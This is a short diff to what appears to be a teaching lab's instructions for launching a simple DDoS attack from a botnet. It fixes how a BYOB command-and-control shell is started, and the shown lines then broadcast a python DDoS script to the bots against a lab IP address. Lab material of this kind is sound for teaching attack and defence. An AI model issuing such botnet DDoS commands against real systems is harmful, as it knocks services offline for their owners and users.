@@ -124,7 +124,7 @@ In this task, we will conduct student to launch a simple DDoS attack in our botn
 ```
 //Bash window 1
 $ docksh <c2 server container ID>
-$ /start-byob-sehll
+$ start-byob-sehll
 //waiting for bots online
 $ broadcast python3 /tmp/ddos.py 10.155.0.71
 
